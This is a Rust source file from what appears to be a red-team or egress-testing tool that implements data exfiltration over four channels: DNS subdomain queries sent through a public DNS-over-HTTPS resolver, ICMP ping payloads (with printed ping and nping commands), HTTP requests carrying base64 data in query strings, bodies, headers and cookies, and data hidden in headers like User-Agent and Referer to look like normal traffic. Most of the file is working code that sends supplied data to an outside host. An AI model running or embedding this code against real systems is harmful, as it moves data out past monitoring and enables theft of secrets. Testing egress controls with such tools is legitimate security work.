use base64::{Engine as _, engine::general_purpose};
use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn dns(domain: &str, data: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} DNS Exfiltration Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Domain: {}", "[*]".cyan().bold(), domain);
    println!("{} Data:   {}", "[*]".cyan().bold(), data);
    println!("{}", "-".repeat(60).dimmed());

    let encoded = general_purpose::STANDARD.encode(data.as_bytes());
    println!("{} Base64 encoded: {}", "[*]".cyan().bold(), encoded);

    let chunks: Vec<String> = encoded
        .chars()
        .collect::<Vec<_>>()
        .chunks(63)
        .map(|c| c.iter().collect())
        .collect();
    println!(
        "{} Chunks: {} (max 63 chars per label)",
        "[*]".cyan().bold(),
        chunks.len()
    );

    let client = build_client(timeout);
    let mut queries = Vec::new();

    for (i, chunk) in chunks.iter().enumerate() {
        let subdomain = format!("{}.{}.{}", chunk, i, domain);
        queries.push(subdomain.clone());
        println!(
            "  {} Query {}/{}: {}",
            "*".cyan(),
            i + 1,
            chunks.len(),
            subdomain
        );

        let url = format!("https://dns.google/resolve?name={}&type=A", subdomain);
        match client.get(&url).send().await {
            Ok(resp) => {
                let _status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                if body.contains("\"Answer\"") {
                    println!(
                        "    {} Resolved — data exfiltrated via DNS!",
                        ">".green().bold()
                    );
                }
            }
            Err(_) => {
                println!("    {} Error sending query", ">".red());
            }
        }
    }

    println!("\n{} DNS exfil simulation complete.", "[*]".cyan().bold());
    println!(
        "{} In a real attack, the attacker controls the DNS server for {}.",
        "[*]".cyan().bold(),
        domain
    );
    println!("{} Queries sent: {}", "[*]".cyan().bold(), queries.len());
    Ok(())
}

pub async fn icmp(host: &str, data: &str, _timeout: u64) -> anyhow::Result<()> {
    println!("{} ICMP Exfiltration Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Host: {}", "[*]".cyan().bold(), host);
    println!("{} Data: {}", "[*]".cyan().bold(), data);
    println!("{}", "-".repeat(60).dimmed());

    let encoded = general_purpose::STANDARD.encode(data.as_bytes());
    let bytes = encoded.as_bytes();
    println!(
        "{} Encoded: {} ({} bytes)",
        "[*]".cyan().bold(),
        encoded,
        bytes.len()
    );

    let chunk_size = 32;
    let chunks: Vec<&[u8]> = bytes.chunks(chunk_size).collect();
    println!(
        "{} ICMP packets needed: {} ({} bytes/packet)",
        "[*]".cyan().bold(),
        chunks.len(),
        chunk_size
    );

    for (i, chunk) in chunks.iter().enumerate() {
        let payload = String::from_utf8_lossy(chunk).to_string();
        println!(
            "  {} Packet {}/{}: data={} ({} bytes)",
            "*".cyan(),
            i + 1,
            chunks.len(),
            payload,
            chunk.len()
        );
    }

    println!("\n{} ICMP exfil simulation complete.", "[*]".cyan().bold());
    println!(
        "{} In a real attack, send: ping -p <hex> -s {} {}",
        "[*]".cyan().bold(),
        chunk_size,
        host
    );
    println!(
        "{} Or use: nping --icmp -c 1 --data-string <payload> {}",
        "[*]".cyan().bold(),
        host
    );
    Ok(())
}

pub async fn http(url: &str, data: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP Exfiltration Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:  {}", "[*]".cyan().bold(), url);
    println!("{} Data: {}", "[*]".cyan().bold(), data);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let encoded = general_purpose::STANDARD.encode(data.as_bytes());

    let methods = [
        ("GET (query param)", "GET", format!("{}?d={}", url, encoded)),
        ("POST (body)", "POST", encoded.clone()),
        (
            "POST (json)",
            "POST",
            format!("{{\"data\":\"{}\"}}", encoded),
        ),
        ("GET (header)", "GET", String::new()),
        ("GET (cookie)", "GET", String::new()),
        ("PUT (body)", "PUT", encoded.clone()),
        ("PATCH (body)", "PATCH", encoded.clone()),
    ];

    for (name, method, body) in &methods {
        let mut req = match *method {
            "GET" => client.get(url),
            "POST" => client.post(url).body(body.clone()),
            "PUT" => client.put(url).body(body.clone()),
            "PATCH" => client.patch(url).body(body.clone()),
            _ => continue,
        };

        if name.contains("header") {
            req = req.header("X-Data", &encoded);
        }
        if name.contains("cookie") {
            req = req.header("Cookie", format!("data={}", encoded));
        }
        if name.contains("json") {
            req = req.header("Content-Type", "application/json");
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                println!(
                    "  {} {:25} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    if status < 400 {
                        "sent".green().to_string()
                    } else {
                        "error".to_string()
                    }
                );
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!("\n{} HTTP exfil test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn stego(url: &str, data: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Steganographic Exfiltration Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:  {}", "[*]".cyan().bold(), url);
    println!("{} Data: {}", "[*]".cyan().bold(), data);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let encoded = general_purpose::STANDARD.encode(data.as_bytes());

    let channels = [
        ("X-Comment header", vec![("X-Comment", encoded.clone())]),
        ("X-Debug header", vec![("X-Debug", encoded.clone())]),
        ("X-Trace header", vec![("X-Trace", encoded.clone())]),
        (
            "User-Agent",
            vec![("User-Agent", format!("Mozilla/5.0 {}", encoded))],
        ),
        (
            "Referer",
            vec![("Referer", format!("https://example.com/{}", encoded))],
        ),
        (
            "X-Forwarded-For",
            vec![("X-Forwarded-For", format!("127.0.0.1 {}", encoded))],
        ),
        (
            "Multiple headers",
            vec![
                ("X-A", encoded[..20].to_string()),
                ("X-B", encoded[20..].to_string()),
            ],
        ),
    ];

    for (name, headers) in &channels {
        let mut req = client.get(url);
        for (k, v) in headers {
            req = req.header(*k, v);
        }
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                println!(
                    "  {} {:25} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    if status < 400 {
                        "sent".green().to_string()
                    } else {
                        "error".to_string()
                    }
                );
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!("\n{} Stego exfil test complete.", "[*]".cyan().bold());
    println!(
        "{} Data hidden in HTTP headers — appears as normal traffic.",
        "[*]".cyan().bold()
    );
    Ok(())
}
